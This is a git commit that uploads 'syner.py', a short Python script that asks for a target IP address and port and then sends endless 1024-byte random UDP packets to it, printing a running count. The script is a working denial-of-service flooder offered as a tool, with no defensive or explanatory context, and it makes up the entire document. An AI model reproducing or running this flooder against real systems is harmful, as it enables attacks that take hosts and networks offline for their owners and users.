1f04782392930c49742b3b1d5ddcd17c7687e621
GOATFUCK69 <100534042+GOATFUCK69@users.noreply.github.com>
2022-02-28 06:05:42 -0800

    Add files via upload

---
+++ syner.py
@@ -0,0 +1,12 @@
+import socket
+import random
+print ("welcome to syner by FESKI")
+sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+bytes=random._urandom(1024)
+ip = input("TARGET IP :") #Ex 192.168.1.2
+port = int(input('Port :')) #53 80 or 443
+sent = 0
+while True:
+    sock.sendto(bytes,(ip,port))
+    print("Sent %s amount of packets to %s at port %s."%(sent,ip,port))
+    sent = sent+1
